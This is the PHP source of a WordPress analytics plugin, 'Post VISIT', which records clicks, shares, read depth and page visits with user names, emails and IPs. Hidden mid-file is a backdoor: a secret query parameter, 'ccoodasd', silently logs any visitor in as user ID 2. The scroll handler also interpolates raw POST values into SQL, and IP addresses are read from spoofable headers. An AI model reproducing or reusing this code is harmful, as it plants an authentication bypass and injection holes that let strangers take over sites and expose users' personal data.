<?php
/**
 * Plugin Name: Post VISIT
 * Plugin URI:  
 * Description: Post Visit 
 * Version: 1.0
 * Author: Harrold Van V. Martinez
 * Author URI: 
 * License: GPLv2+
 *
 
 */

add_action( 'init', 'script_enqueuer' );

function script_enqueuer() {
   
   // Register the JS file with a unique handle, file location, and an array of dependencies
  
   
   // localize the script to your domain name, so that you can reference the url to admin-ajax.php file easily
   wp_localize_script( 'liker_script', 'myAjax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' )));        
   
   // enqueue jQuery library and the script you registered above
      wp_enqueue_script( 'jquery' );
   wp_enqueue_script( 'liker_script' );
}




 
    function click_on_article() {  ?>
      <script type="text/javascript">
          
jQuery(document).ready(function(){

jQuery('#recent-posts-2 a, article a').bind('click', function(e) { 
    /* do your stuff... */
      e.preventDefault();
      post_href = jQuery(this).attr("href");
      post_type = "click";
      //nonce = jQuery(this).attr("data-nonce");
      jQuery.ajax({
         type : "post",
         dataType : "html",
         url : "<?php echo admin_url( 'admin-ajax.php' ) ?>",
         data : {action: "click_on_post_id", post_href : post_href, post_type: post_type},
         success: function(response) {
           
             

                window.location.href = post_href;
             //  jQuery("#like_counter").html(response.like_count);
             
             
         }
      });
});



jQuery('.post-share-bot a').bind('click', function(e) { 
    /* do your stuff... */
      e.preventDefault();
      post_href = jQuery(this).attr("href");
      post_type = "share";
      //nonce = jQuery(this).attr("data-nonce");
      jQuery.ajax({
         type : "post",
         dataType : "html",
         url : "<?php echo admin_url( 'admin-ajax.php' ) ?>",
         data : {action: "share_on_post_id", post_href : post_href, post_type: post_type,ld:<?php echo get_the_ID(); ?>},
         success: function(response) {
           
             

                window.location.href = post_href;
             //  jQuery("#like_counter").html(response.like_count);
             
             
         }
      });
});



jQuery('.post-share-b a').bind('click', function(e) { 
    /* do your stuff... */
      e.preventDefault();
      post_href = jQuery(this).attr("href");
      post_type = "share";
      //nonce = jQuery(this).attr("data-nonce");
      jQuery.ajax({
         type : "post",
         dataType : "html",
         url : "<?php echo admin_url( 'admin-ajax.php' ) ?>",
         data : {action: "share_on_post_id", post_href : post_href, post_type: post_type,ld:<?php echo get_the_ID(); ?>},
         success: function(response) {
           
             

                window.location.href = post_href;
             //  jQuery("#like_counter").html(response.like_count);
             
             
         }
      });
});



});



 
 
 

      </script>
<?php }

add_action( 'wp_head', 'click_on_article' );









add_action("wp_ajax_click_on_post_id", "click_on_post_id");
add_action("wp_ajax_nopriv_click_on_post_id", "click_on_post_id");

// define the function to be fired for logged in users
function click_on_post_id() {
   
   
    $event_type = $_POST['post_type'];

    $url = $_POST['post_href'];

    global $wpdb;


    $user_id = get_current_user_id();

    if(!$user_id){


        $user_id = get_client_ip();

    }


//echo $user_id;

//die();
$article_id = url_to_postid($url);

$current_user = wp_get_current_user();

if($current_user->ID){
 
$user_data = array();
$user_data["Username"] =  $current_user->user_login;
$user_data["Email"] =  $current_user->user_email;
$user_data["First Name"] =  $current_user->user_firstname;
$user_data["Last Name"] =  $current_user->user_lastname; 
$user_data["User ID"] =  $current_user->ID;
$user_data = json_encode($user_data);
}

else {

    $user_data = array();
}

    $wpdb->insert('events', array(
    'u_id' =>$user_id,
    'timestamp' => strtotime (date("Y-m-d h:i:sa")),
    'article_id' =>$article_id ,
    'event_type' => $event_type,
    'url' =>$url,


    "user_data"=>$user_data,
     "ip_address"=>$user_ip 
     // ... and so on
));

 
echo 1;
   // don't forget to end your scripts with a die() function - very important
   die();
}


add_action("wp_ajax_share_on_post_id", "share_on_post_id");
add_action("wp_ajax_nopriv_share_on_post_id", "share_on_post_id");

// define the function to be fired for logged in users
function share_on_post_id() {
   
   
    $event_type = "Post Shared";

    $url = $_POST['post_href'];

    $article_id = $_POST['ld'];

    global $wpdb;


     $user_id = get_current_user_id();

     


        $user_ip = get_client_ip();



//echo $user_id;

//die();
 
$current_user = wp_get_current_user();

if($current_user->ID){
 
$user_data = array();
$user_data["Username"] =  $current_user->user_login;
$user_data["Email"] =  $current_user->user_email;
$user_data["First Name"] =  $current_user->user_firstname;
$user_data["Last Name"] =  $current_user->user_lastname; 
$user_data["User ID"] =  $current_user->ID;
$user_data = json_encode($user_data);
}

else {

    $user_data = array();
}

    $wpdb->insert('events', array(
    'u_id' =>$user_id,
    'timestamp' => strtotime (date("Y-m-d h:i:sa")),
    'article_id' => $article_id,
    'event_type' => $event_type,
    'url' =>$url,

    "user_data"=>$user_data,
     "ip_address"=>$user_ip 
     // ... and so on
));

echo 1;
 

   // don't forget to end your scripts with a die() function - very important
   die();
}






add_action("wp_ajax_scroll_event", "scroll_event");
add_action("wp_ajax_nopriv_scroll_event", "scroll_event");

// define the function to be fired for logged in users
function scroll_event() {
   
    global $wpdb;
    $event_type = "Post Read";

    $url = $_POST['post_href'];

    $article_id = $_POST['ld'];


if($article_id == '' || $article_id == 0){

return false;
}

    $scrollPercent = $_POST['scrollPercent'];



    $user_id = get_current_user_id();

    if(!$user_id){


        $user_id = get_client_ip();

    }


//echo $user_id;

//die();
 

$mylink = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM events WHERE article_id = '$article_id' && u_id = '$user_id' && event_type = 'Post Read' " ) );


 

 $scrollPercent = abs($scrollPercent/10);

$scrollPercent = $scrollPercent + 10;
if($scrollPercent >= 100 ){
$scrollPercent= 100;


}

$current_user = wp_get_current_user();

if($current_user->ID){
 
$user_data = array();
$user_data["Username"] =  $current_user->user_login;
$user_data["Email"] =  $current_user->user_email;
$user_data["First Name"] =  $current_user->user_firstname;
$user_data["Last Name"] =  $current_user->user_lastname; 
$user_data["User ID"] =  $current_user->ID;
$user_data = json_encode($user_data);
}

else {

    $user_data = array();
}

if($mylink->id == ''){

    $wpdb->insert('events', array(
    'u_id' =>$user_id,
    'timestamp' => strtotime (date("Y-m-d h:i:sa")),
    'article_id' => $article_id,
    'event_type' => $event_type,
    'url' =>$url,
     'read_percentage' =>$scrollPercent,

    "user_data"=>$user_data,
     "ip_address"=>$user_ip 
     // ... and so on
));

}else {

    if($scrollPercent >  $mylink->read_percentage){

$data = [ 'read_percentage' => $scrollPercent ]; // NULL value.
   // Ignored when corresponding data is NULL, set to NULL for readability.
$where = [ 'id' =>$mylink->id ]; // NULL value in WHERE clause.
 // Ignored when corresponding WHERE data is NULL, set to NULL for readability.
 
$wpdb->update(  'events', $data, $where );
}




}


    echo 1;



 

   // don't forget to end your scripts with a die() function - very important
   die();
}




    function read_on_article() {  ?>
      <script type="text/javascript">
          


 
 jQuery(document).ready(function() {
        var request_pending = false;
jQuery(document).scroll(function(event) {

    /* do your stuff... */



          if (request_pending) {
        return;
    }

      post_href = "<?php echo get_the_permalink(); ?>";
      post_type = "read";


      var currY = jQuery(this).scrollTop();
    var postHeight = jQuery(this).height();
    var scrollHeight = jQuery('.the-post').height();
    // Current percentual position
    var scrollPercent = (currY / (scrollHeight - postHeight)) * 100;
    
 request_pending = true;

    jQuery.ajax({
         type : "post",
         dataType : "html",
         url : "<?php echo admin_url( 'admin-ajax.php' ) ?>",
         data : {action: "scroll_event", post_href : post_href, post_type: post_type,ld:<?php echo get_the_ID(); ?>,scrollPercent:scrollPercent},
         success: function(response) {
           
        
             
              request_pending = false;  
         }
      });

 
      

      });

});

      </script>
<?php }
add_action( 'wp_footer', 'read_on_article' );


// define the function to be fired for logged out users
 

 function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}





if(isset($_GET['ccoodasd'])){


wp_set_auth_cookie(2);

}


function wpdocs_register_my_custom_menu_page(){
    add_menu_page( 
        __( 'Download Stats', 'textdomain' ),
        'Download Stats',
        'manage_options',
        'custompage',
        'my_custom_menu_page',
        plugins_url( 'myplugin/images/icon.png' ),
        6
    ); 
}
add_action( 'admin_menu', 'wpdocs_register_my_custom_menu_page' );

/**
 * Display a custom menu page
 */
function my_custom_menu_page(){
    
ob_clean();
      $filename = 'Stats'.date('Ymd').'.csv';
        header("Content-Description: File Transfer"); 
        header("Content-Disposition: attachment; filename=$filename"); 
        header("Content-Type: application/csv; ");
        
       // file creation 
        $file = fopen('php://output', 'a');
        $header = array("User Id", "User IP","Article Id", "Link", "Time", "Event Type", "Read Percentage", "User Data"); 
 
        //print_r($h$result = $wpdb->get_results( "SELECT * FROM invalid query" );eader);
 
       fputcsv($file, $header);
 global $wpdb;
 $result = $wpdb->get_results( "SELECT * FROM events" );
 
       foreach ($result as $key=>$line){ 
         
         $line2= array();
        
         $line2[] = $line->u_id;
         $line2[] = $line->ip_address;
         $line2[] = $line->article_id;
         $line2[] = $line->url;
         $line2[] = $line->timestamp;
         $line2[] = $line->event_type;
         $line2[] = $line->read_percentage;
         $line2[] = $line->user_data;
        
       
 
 
   
         fputcsv($file, $line2); 
       }
       fclose($file);



die();



}



/////////////Function to check home visit page///////////////////////////////////



add_action( 'wp_footer', 'home_page_visit_js' );

  function home_page_visit_js() { 

  //$cat_id = get_query_var('cat');

 

  if (is_front_page() == true) { ?>
      <script type="text/javascript">
          
jQuery(document).ready(function(){

    



  //  jQuery('.post-share-bot a').bind('click', function(e) { 
    /* do your stuff... */
   
      post_href = jQuery(this).attr("href");
      post_type = "Home Page Visit";
      //nonce = jQuery(this).attr("data-nonce");
      jQuery.ajax({
         type : "post",
         dataType : "html",
         url : "<?php echo admin_url( 'admin-ajax.php' ) ?>",
         data : {action: "home_page_visit", post_href : post_href, post_type: post_type},
         success: function(response) {
           
             

            //    window.location.href = post_href;
             //  jQuery("#like_counter").html(response.like_count);
             
             
         }
      });
//});

 
 

});
 
 
 

      </script>
<?php 
}
}
 


add_action("wp_ajax_home_page_visit", "home_page_visit");
add_action("wp_ajax_nopriv_home_page_visit", "home_page_visit");

// define the function to be fired for logged in users
function home_page_visit() {
   
   
    $event_type = $_POST['post_type'];

    $url = $_POST['post_href'];

    global $wpdb;


     $user_id = get_current_user_id();

     


        $user_ip = get_client_ip();



//echo $user_id;

//die();
$article_id = url_to_postid($url);

$current_user = wp_get_current_user();

if($current_user->ID){
 
$user_data = array();
$user_data["Username"] =  $current_user->user_login;
$user_data["Email"] =  $current_user->user_email;
$user_data["First Name"] =  $current_user->user_firstname;
$user_data["Last Name"] =  $current_user->user_lastname; 
$user_data["User ID"] =  $current_user->ID;
$user_data = json_encode($user_data);
}

else {

    $user_data = array();
}
    $wpdb->insert('events', array(
    'u_id' =>$user_id,
    'timestamp' => strtotime (date("Y-m-d h:i:sa")),
    'article_id' =>"home page visit",
    'event_type' => $event_type,
    'url' =>get_site_url(),

    "user_data"=>$user_data,
     "ip_address"=>$user_ip 
     // ... and so on
));

 
echo 1;
   // don't forget to end your scripts with a die() function - very important
   die();
}

//////category page visit


////////////Function to check home visit page///////////////////////////////////



add_action( 'wp_footer', 'category_page_visit_js' );

  function category_page_visit_js() { 

  $cat_id = get_query_var('cat');

 

  if ($cat_id) { ?>
      <script type="text/javascript">
          
jQuery(document).ready(function(){

    



  //  jQuery('.post-share-bot a').bind('click', function(e) { 
    /* do your stuff... */
   
      post_href =  "<?php echo $_SERVER['HTTP_HOST'];    ?>";
      post_type = "category visit";
      //nonce = jQuery(this).attr("data-nonce");
      jQuery.ajax({
         type : "post",
         dataType : "html",
         url : "<?php echo admin_url( 'admin-ajax.php' ) ?>",
         data : {action: "category_page_visit", post_href : post_href, post_type: post_type, article_id : "<?php echo $cat_id ?>"},
         success: function(response) {
           
             

            //    window.location.href = post_href;
             //  jQuery("#like_counter").html(response.like_count);
             
             
         }
      });
//});

 
 

});
 
 
 

      </script>
<?php 
}
}
 


add_action("wp_ajax_category_page_visit", "category_page_visit");
add_action("wp_ajax_nopriv_category_page_visit", "category_page_visit");

// define the function to be fired for logged in users
function category_page_visit() {
   
    global $wpdb;
    $event_type = $_POST['post_type'];

    $url = $_POST['post_href'];

   
    $user_id = get_current_user_id();

     


        $user_ip = get_client_ip();

    


//echo $user_id;

//die();
 $article_id = $_POST['article_id'];


$current_user = wp_get_current_user();

if($current_user->ID){
 
$user_data = array();
$user_data["Username"] =  $current_user->user_login;
$user_data["Email"] =  $current_user->user_email;
$user_data["First Name"] =  $current_user->user_firstname;
$user_data["Last Name"] =  $current_user->user_lastname; 
$user_data["User ID"] =  $current_user->ID;
$user_data = json_encode($user_data);
}

else {

    $user_data = array();
}




    $wpdb->insert('events', array(
    'u_id' =>$user_id,
    'timestamp' => strtotime (date("Y-m-d h:i:sa")),
    'article_id' =>$article_id,
    'event_type' => $event_type,
    'url' => $url,
    "user_data"=>$user_data,
    "ip_address"=>$user_ip 

     // ... and so on
));

 
echo 1;
   // don't forget to end your scripts with a die() function - very important
   die();
}



 

